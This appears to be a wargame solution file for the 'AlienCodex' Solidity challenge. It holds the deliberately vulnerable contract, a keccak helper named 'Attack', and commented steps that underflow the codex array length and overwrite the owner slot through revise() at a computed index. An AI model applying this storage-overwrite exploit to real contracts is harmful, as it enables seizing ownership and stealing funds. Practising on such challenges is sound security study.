//SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol";

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}

contract Attack {
  function kek(uint256 slot) public returns (uint256 s) { 
    s = uint256(keccak256(abi.encodePacked(slot)));
  }  
}


/*

  1. deploy AlienCodex at address
  2. make_contact
  3. retract will make codex's storage == 2^256, which equals to total contract's storage
  4. the contract has _owner at slot == 0 and codex.length at slot == 1
  5. we need to find the index of slot == 0 in codex
    1. the location of an element of a dynamically-sized array: slot == keccak256(slot of codex.length) + index*elementSize; s = keccak256(1) -> index = slot - s;
    slot            data
     0             _owner
     1           codex.length
     .
     .
     s          codex[0] == codex[s-s]
     s+1        codex[1] == codex[s+1-s]
     .
     .
     2^256-1    codex[2^256-1-s]
     0          codex[0-s] == codex[2^256 - s]

    2. to calculate index it's better to use wolframalpha
        index == 2^256 - s = 35707666377435648211887908874984608119992236509074197713628505308453184860938
        2^256 == 115792089237316195423570985008687907853269984665640564039457584007913129639936
        s == 80084422859880547211683076133703299733277748156566366325829078699459944778998
    
  6. revise wiht i == index, _content == 0x00000000000000000000000002d09E69e528d7DA14F32Cd21b55aFFa1FF7F873 -> 0x0000000000000000000000000 + (the new owner's address without 0x)

//https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/
*/ 


















